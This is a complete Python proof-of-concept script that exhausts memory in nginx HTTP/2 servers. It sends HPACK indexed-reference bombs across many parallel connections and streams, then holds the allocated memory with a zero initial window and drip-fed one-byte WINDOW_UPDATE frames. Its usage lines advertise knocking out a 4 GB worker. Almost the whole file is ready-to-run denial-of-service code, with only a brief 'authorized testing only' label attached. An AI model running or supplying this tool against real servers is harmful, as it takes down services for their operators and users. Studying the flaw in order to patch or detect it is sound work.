#!/usr/bin/env /usr/bin/python3
"""
HPACK Bomb + HTTP/2 Window Stall

Demonstrates memory amplification in nginx HTTP/2:
  - 59:1 memory amplification via HPACK indexed reference bomb
  - Indefinite resource hold via INITIAL_WINDOW_SIZE=0 + periodic WINDOW_UPDATE drip

Zero dependencies — uses only Python stdlib (ssl, socket, struct).

RESEARCH PoC FOR AUTHORIZED SECURITY TESTING ONLY.

Usage:
  # Single connection (~280 MB server memory)
  ./hpack_bomb.py --host 127.0.0.1 --port 443 --connections 1

  # OOM a 4 GB worker
  ./hpack_bomb.py --host 127.0.0.1 --port 443 --connections 15

  # Custom hold time (drip WINDOW_UPDATEs to keep memory parked)
  ./hpack_bomb.py --host 127.0.0.1 --port 443 --connections 15 --hold 3600
"""

import argparse
import socket
import ssl
import struct
import sys
import threading
import time

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Frame types
FRAME_DATA          = 0x0
FRAME_HEADERS       = 0x1
FRAME_SETTINGS      = 0x4
FRAME_PING          = 0x6
FRAME_GOAWAY        = 0x7
FRAME_WINDOW_UPDATE = 0x8

# Flags
FLAG_END_STREAM  = 0x1
FLAG_END_HEADERS = 0x4
FLAG_ACK         = 0x1

# Settings IDs
SETTINGS_HEADER_TABLE_SIZE  = 0x1
SETTINGS_ENABLE_PUSH        = 0x2
SETTINGS_MAX_CONCURRENT     = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE     = 0x5

DEFAULT_WINDOW = 65535
MAX_FRAME_SIZE = 16384

def frame(ftype, flags, stream_id, payload):
    """Build an HTTP/2 frame."""
    hdr = struct.pack("!I", len(payload))[1:]  # 3-byte length
    hdr += struct.pack("!BB", ftype, flags)
    hdr += struct.pack("!I", stream_id)
    return hdr + payload


def settings_frame(params, ack=False):
    """Build SETTINGS frame. params = [(id, value), ...]"""
    if ack:
        return frame(FRAME_SETTINGS, FLAG_ACK, 0, b"")
    payload = b""
    for pid, val in params:
        payload += struct.pack("!HI", pid, val)
    return frame(FRAME_SETTINGS, 0, 0, payload)


def window_update_frame(stream_id, increment):
    """Build WINDOW_UPDATE frame."""
    payload = struct.pack("!I", increment)
    return frame(FRAME_WINDOW_UPDATE, 0, stream_id, payload)


def ping_ack_frame(opaque_data):
    """Build PING ACK frame."""
    return frame(FRAME_PING, FLAG_ACK, 0, opaque_data)


def parse_frames(data):
    """Yield (ftype, flags, stream_id, payload) from raw data."""
    while len(data) >= 9:
        length = (data[0] << 16) | (data[1] << 8) | data[2]
        ftype = data[3]
        flags = data[4]
        stream_id = struct.unpack("!I", data[5:9])[0] & 0x7FFFFFFF
        if len(data) < 9 + length:
            break
        payload = data[9:9 + length]
        yield (ftype, flags, stream_id, payload)
        data = data[9 + length:]


def build_hpack_bomb(num_headers):
    """
    Build an HPACK-encoded header block that decodes to a massive header list.

    Strategy:
      1. Emit mandatory pseudo-headers using static table indexed references.
      2. Insert one entry ("a", "") into the dynamic table via literal-with-indexing.
      3. Emit (num_headers - 5) indexed references to that dynamic table entry.

    Each indexed reference = 1 byte on wire, but the server allocates:
      - 3 bytes in state.pool (name copy + value copy)
      - 56 bytes in r->pool (ngx_table_elt_t via ngx_list_push)
      ≈ 59 bytes of server memory per 1 wire byte.
    """
    block = bytearray()

    # Pseudo-headers via static table (indexed representation, 1 byte each):
    #   Index 2  = :method GET
    #   Index 4  = :path /
    #   Index 6  = :scheme https
    #   Index 1  = :authority (name only, need literal value)
    block.append(0x80 | 2)   # :method GET
    block.append(0x80 | 4)   # :path /
    block.append(0x80 | 6)   # :scheme https

    # :authority — literal with incremental indexing, name from static index 1
    # Format: 0x41 (incremental indexing, name index 1), then value "x"
    block.append(0x41)       # literal with indexing, name index = 1
    block.append(0x01)       # value length = 1 (not Huffman)
    block.append(ord("x"))   # value = "x"
    # This adds ":authority: x" to the dynamic table as entry 62.

    # Insert bomb entry: literal with incremental indexing, new name "a", empty value
    # Format: 0x40 (literal with indexing, new name), name_len, name, value_len
    block.append(0x40)       # literal with indexing, new name
    block.append(0x01)       # name length = 1
    block.append(ord("a"))   # name = "a"
    block.append(0x00)       # value length = 0 (empty)
    # Dynamic table now has entry 62 = (":authority", "x") and 63 = ("a", "")
    # Wait — newest entry is always index 62 in HPACK. So "a" is now 62,
    # and ":authority: x" shifted to 63.

    # Indexed references to dynamic entry 62 ("a", "")
    # 0xBE = 0x80 | 62 = indexed representation for index 62
    #
    # header_limit deduction per reference: name.len + value.len = 1 + 0 = 1 byte
    # Available budget: 32768 - (pseudo-headers cost)
    #   :method GET     = not counted (indexed, no literal processing in process_header)
    #   Actually: every header goes through process_header which deducts name+value.
    #   :method(7) + GET(3) = 10, :path(5) + /(1) = 6, :scheme(6) + https(5) = 11,
    #   :authority(10) + x(1) = 11, a(1) + ""(0) = 1 (the insert)
    #   Total pseudo overhead: 10 + 6 + 11 + 11 + 1 = 39 bytes
    #   Remaining: 32768 - 39 = 32729 indexed references
    #
    # But to be safe, use the caller's num_headers minus the 5 headers above.
    refs = num_headers - 5
    if refs < 0:
        refs = 0
    block.extend(b"\xbe" * refs)

    return bytes(block)


def split_into_frames(stream_id, header_block, max_payload=MAX_FRAME_SIZE):
    """
    Split an HPACK block into a HEADERS frame + CONTINUATION frames.
    Returns list of raw frame bytes.
    """
    frames = []
    offset = 0
    first = True

    while offset < len(header_block):
        chunk = header_block[offset:offset + max_payload]
        offset += len(chunk)

        is_last = (offset >= len(header_block))

        if first:
            flags = FLAG_END_STREAM
            if is_last:
                flags |= FLAG_END_HEADERS
            frames.append(frame(FRAME_HEADERS, flags, stream_id, chunk))
            first = False
        else:
            flags = FLAG_END_HEADERS if is_last else 0
            # CONTINUATION frame type = 0x9
            frames.append(frame(0x9, flags, stream_id, chunk))

    return frames


class H2Attack:
    def __init__(self, host, port, num_streams, num_headers, conn_id=0, verbose=False):
        self.host = host
        self.port = port
        self.num_streams = num_streams
        self.num_headers = num_headers
        self.conn_id = conn_id
        self.verbose = verbose
        self.sock = None
        self.stream_ids = []
        self.active = False

    def log(self, msg):
        if self.verbose:
            print(f"  [conn {self.conn_id}] {msg}")

    def connect(self):
        """Establish TLS + HTTP/2 connection."""
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(30)
        raw.connect((self.host, self.port))

        self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
        negotiated = self.sock.selected_alpn_protocol()
        if negotiated != "h2":
            raise RuntimeError(f"ALPN negotiated '{negotiated}', expected 'h2'")
        self.log("TLS + h2 connected")

    def handshake(self):
        """Send H2 preface and SETTINGS with INITIAL_WINDOW_SIZE=0."""
        # Client preface
        self.sock.sendall(H2_PREFACE)

        # SETTINGS: disable push, set initial window to 0
        self.sock.sendall(settings_frame([
            (SETTINGS_ENABLE_PUSH, 0),
            (SETTINGS_INITIAL_WINDOW_SIZE, 0),
        ]))

        # Consume server preface + settings
        self._drain(timeout=2.0)

        # ACK server's SETTINGS
        self.sock.sendall(settings_frame([], ack=True))

        self.log("H2 handshake done (INITIAL_WINDOW_SIZE=0)")

    def send_bombs(self):
        """Send HPACK bomb HEADERS on all streams."""
        self.log(f"Building HPACK bomb: {self.num_headers} headers/stream, "
                 f"{self.num_streams} streams")

        hpack_block = build_hpack_bomb(self.num_headers)
        wire_per_stream = len(hpack_block)

        self.log(f"HPACK block size: {wire_per_stream:,} bytes "
                 f"({wire_per_stream / 1024:.1f} KB)")

        total_wire = 0
        for i in range(self.num_streams):
            stream_id = 2 * i + 1  # odd IDs: 1, 3, 5, ...
            self.stream_ids.append(stream_id)

            raw_frames = split_into_frames(stream_id, hpack_block)
            for f in raw_frames:
                self.sock.sendall(f)
                total_wire += len(f)

        self.log(f"Sent {self.num_streams} streams, "
                 f"total wire: {total_wire:,} bytes ({total_wire / 1024 / 1024:.1f} MB)")
        self.active = True

        # Drain any server responses (SETTINGS ACK, HEADERS responses, etc.)
        self._drain(timeout=1.0)

        return total_wire

    def hold_with_drip(self, hold_seconds, drip_interval=50):
        """
        Hold server memory by drip-feeding 1-byte WINDOW_UPDATEs.

        Each WINDOW_UPDATE lets the server send 1 byte of response body,
        which resets the send_timeout timer (default 60s). The stream stays
        alive as long as there are body bytes remaining.
        """
        self.log(f"Holding for {hold_seconds}s (drip every {drip_interval}s)")
        t0 = time.monotonic()
        drip_count = 0

        while time.monotonic() - t0 < hold_seconds:
            # Wait for drip interval, but respond to PINGs
            wait_until = time.monotonic() + drip_interval
            while time.monotonic() < wait_until:
                remaining = wait_until - time.monotonic()
                if remaining <= 0:
                    break
                self._drain(timeout=min(remaining, 5.0))

            # Drip: 1-byte WINDOW_UPDATE per stream + connection level
            if not self.active:
                break

            try:
                # Connection-level window update
                self.sock.sendall(window_update_frame(0, 1))

                # Per-stream window updates
                for sid in self.stream_ids:
                    self.sock.sendall(window_update_frame(sid, 1))

                drip_count += 1
                elapsed = time.monotonic() - t0
                self.log(f"Drip #{drip_count} at {elapsed:.0f}s "
                         f"({len(self.stream_ids)} streams)")
            except (BrokenPipeError, ConnectionResetError, OSError):
                self.log("Connection lost during drip")
                self.active = False
                break

        elapsed = time.monotonic() - t0
        self.log(f"Hold phase ended after {elapsed:.0f}s, {drip_count} drips")

    def _drain(self, timeout=1.0):
        """Read and handle incoming frames (respond to PINGs, ignore rest)."""
        self.sock.settimeout(timeout)
        try:
            while True:
                data = self.sock.recv(65536)
                if not data:
                    self.active = False
                    return
                for ftype, flags, sid, payload in parse_frames(data):
                    if ftype == FRAME_PING and not (flags & FLAG_ACK):
                        try:
                            self.sock.sendall(ping_ack_frame(payload))
                        except OSError:
                            self.active = False
                            return
                    elif ftype == FRAME_GOAWAY:
                        self.log(f"Received GOAWAY (error={struct.unpack('!I', payload[4:8])[0] if len(payload) >= 8 else '?'})")
                        self.active = False
                        return
        except (socket.timeout, ssl.SSLWantReadError, BlockingIOError):
            pass
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.active = False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass


def run_attack(args):
    print(f"\n{'=' * 70}")
    print(f"  HPACK Bomb + Window Stall PoC")
    print(f"  Target:      {args.host}:{args.port}")
    print(f"  Connections: {args.connections}")
    print(f"  Streams:     {args.streams} per connection")
    print(f"  Headers:     {args.headers:,} per stream")
    print(f"  Hold:        {args.hold}s (drip every {args.drip_interval}s)")
    print(f"{'=' * 70}")

    # Estimate
    # Per header: ~59 bytes server memory (3 state.pool + 56 ngx_table_elt_t)
    # Plus pool block overhead (~17%)
    mem_per_stream = args.headers * 59 * 1.17
    mem_per_conn = args.streams * mem_per_stream
    mem_total = args.connections * mem_per_conn
    wire_per_stream = args.headers  # 1 byte per indexed reference (approx)
    wire_total = args.connections * args.streams * wire_per_stream

    print(f"\n  Estimated server memory:")
    print(f"    Per stream:     {mem_per_stream / 1024 / 1024:.1f} MB")
    print(f"    Per connection: {mem_per_conn / 1024 / 1024:.0f} MB")
    print(f"    Total:          {mem_total / 1024 / 1024:.0f} MB "
          f"({mem_total / 1024 / 1024 / 1024:.1f} GB)")
    print(f"    Wire upload:    {wire_total / 1024 / 1024:.0f} MB")
    print(f"    Amplification:  {mem_total / wire_total:.0f}:1")
    print()

    connections = []
    total_wire = 0
    lock = threading.Lock()

    t_start = time.monotonic()

    # Phase 1a: Establish all TLS connections in parallel
    print(f"[*] Phase 1a: Establishing {args.connections} TLS+H2 connections...")

    def connect_worker(i):
        c = H2Attack(args.host, args.port, args.streams, args.headers,
                     conn_id=i, verbose=args.verbose)
        try:
            c.connect()
            c.handshake()
            with lock:
                connections.append(c)
        except Exception as e:
            print(f"    Connection {i}: CONNECT FAILED — {e}")
            c.close()

    connect_threads = []
    for i in range(args.connections):
        t = threading.Thread(target=connect_worker, args=(i,), daemon=True)
        t.start()
        connect_threads.append(t)
        time.sleep(0.05)

    for t in connect_threads:
        t.join(timeout=30)

    print(f"    {len(connections)}/{args.connections} connections established "
          f"in {time.monotonic() - t_start:.1f}s")

    if not connections:
        print("[!] No connections established. Exiting.")
        return

    # Phase 1b: Blast all bombs simultaneously (parallel)
    print(f"[*] Phase 1b: Sending HPACK bombs on all {len(connections)} connections...")
    t_bomb = time.monotonic()

    def bomb_worker(c):
        nonlocal total_wire
        try:
            wire = c.send_bombs()
            with lock:
                total_wire += wire
            print(f"    Connection {c.conn_id}: sent {wire / 1024 / 1024:.1f} MB")
        except Exception as e:
            print(f"    Connection {c.conn_id}: SEND FAILED — {e}")
            c.active = False

    bomb_threads = []
    for c in connections:
        t = threading.Thread(target=bomb_worker, args=(c,), daemon=True)
        t.start()
        bomb_threads.append(t)

    for t in bomb_threads:
        t.join(timeout=60)

    t_sent = time.monotonic()
    elapsed = t_sent - t_bomb
    print(f"\n[*] Phase 1 complete: {len(connections)} connections, "
          f"{total_wire / 1024 / 1024:.1f} MB uploaded in {elapsed:.1f}s")
    print(f"    Upload rate: {total_wire / max(elapsed, 0.1) / 1024 / 1024:.1f} MB/s")

    if not connections:
        print("[!] No connections established. Exiting.")
        return

    # Phase 2: Hold with drip-fed WINDOW_UPDATEs
    print(f"\n[*] Phase 2: Holding server memory for {args.hold}s "
          f"(drip every {args.drip_interval}s)...")
    print(f"    Monitor RSS with: docker exec nginx-h2-poc "
          f"/usr/bin/python3 /poc/monitor_rss.py")
    print(f"    Press Ctrl+C to stop early.\n")

    # Run hold phase for each connection in parallel threads
    threads = []
    for c in connections:
        t = threading.Thread(target=c.hold_with_drip,
                             args=(args.hold, args.drip_interval),
                             daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")

    # Phase 3: Cleanup
    t_end = time.monotonic()
    active = sum(1 for c in connections if c.active)
    print(f"\n[*] Done. Total time: {t_end - t_start:.0f}s")
    print(f"    Connections still active: {active}/{len(connections)}")
    print(f"    Total wire uploaded: {total_wire / 1024 / 1024:.1f} MB")

    for c in connections:
        c.close()


def main():
    parser = argparse.ArgumentParser(
        description="HPACK Bomb + HTTP/2 Window Stall — Memory Exhaustion PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single connection demo (~280 MB server memory)
  %(prog)s --host 127.0.0.1 --port 443 -n 1

  # OOM a 4 GB nginx worker
  %(prog)s --host 127.0.0.1 --port 443 -n 15

  # Extended hold with drip (hold for 1 hour)
  %(prog)s --host 127.0.0.1 --port 443 -n 15 --hold 3600
""")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=443, help="Target port")
    parser.add_argument("-n", "--connections", type=int, default=1,
                        help="Number of concurrent connections (default: 1)")
    parser.add_argument("--streams", type=int, default=128,
                        help="Streams per connection (default: 128)")
    parser.add_argument("--headers", type=int, default=32000,
                        help="Headers per stream (default: 32000)")
    parser.add_argument("--hold", type=int, default=120,
                        help="Hold time in seconds (default: 120)")
    parser.add_argument("--drip-interval", type=int, default=50,
                        help="Seconds between WINDOW_UPDATE drips (default: 50)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose per-connection output")

    args = parser.parse_args()

    if args.headers > 32768:
        print(f"Warning: {args.headers} headers exceeds default header_limit (32768). "
              f"Clamping to 32000.")
        args.headers = 32000

    run_attack(args)


if __name__ == "__main__":
    main()
